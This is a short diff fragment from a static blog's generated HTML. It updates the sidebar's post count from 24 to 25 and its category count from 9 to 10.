   </section>
 
   
@@ -1765,7 +1820,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-count">25</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1776,7 +1831,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
